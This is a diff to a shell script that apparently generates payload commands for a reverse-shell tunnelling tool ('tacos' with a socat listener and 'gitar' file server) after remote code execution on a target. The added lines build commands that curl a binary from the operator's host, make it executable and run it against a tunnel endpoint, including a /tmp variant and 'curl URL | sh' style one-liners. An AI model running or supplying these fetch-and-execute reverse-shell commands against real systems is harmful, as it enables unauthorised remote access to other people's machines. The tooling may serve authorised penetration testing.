@@ -21,8 +21,11 @@ for i in "$@"; do
     --windows|-w)
         WINDOWS=true
         ;;
+    --tmp)
+        TACOS_IN_TMP=true
+        ;;
     --no-shortcuts|-N)
-        SHORTCUT="" # ~ setting at false
+        SHORTCUT="" # ~ setting at false (so defualt true)
         ;;
     --help|-h)
         HELP=true
@@ -54,6 +57,8 @@ then
     echo -e "\t-w/--windows if target is a winows machine"
     echo -e "\t-p/--lport for the socat listener local port"
     echo -e "\t--web-port for the gitar lcoal port"
+    echo -e "\t--no-shortcut to disable /sh endpoint of gitar (use longer command)"
+    echo -e "\t--tmp if RCE is not in a writable repository, store tacos in /tmp/tacos (only for linux)"
     echo -e "\nUse this script with caution when you want to expose your listener behind an internet facing endpoint"
     exit 92
 fi
@@ -148,15 +153,21 @@ if [[ "$WINDOWS" ]]; then
     REMOTE_CMD="curl -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && .\\${BINARY} ${TUNNEL_ENDPOINT}"
 else
     REMOTE_CMD="curl -s -O $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x ${BINARY} && ./${BINARY} ${TUNNEL_ENDPOINT}"
+    ## Sometimes RCE is not in a writable directory
+    if [[ "$TACOS_IN_TMP" ]]; then
+        REMOTE_CMD="mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/${BINARY} $DOWNLOAD_URL &&  curl $SHUTDOWN_URL && chmod +x /tmp/tacos/${BINARY} && /tmp/tacos/${BINARY} ${TUNNEL_ENDPOINT}"
+    fi
 fi
+
 
 ## with shorter shortcut?
 if [[ "$SHORTCUT" ]]; then
     ## Write file for gitar
     echo "${REMOTE_CMD}" > sh
     SHORTCUT_URL="${URL}/pull/sh"
-    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})"
-    #curl ${SHORTCUT_URL} |sh\n does not work due to /pkg/tacos/tacos.go:94
+    REMOTE_CMD="\nsh -c \"\$(curl ${SHORTCUT_URL})\"\nsh <(curl ${SHORTCUT_URL})\ncurl ${SHORTCUT_URL}|sh\n"
+    # curl ${SHORTCUT_URL} |sh\n work but trigger error (/pkg/tacos/tacos.go:94)
+    # sh <() only work in zsh & bash
 fi
 
 echo
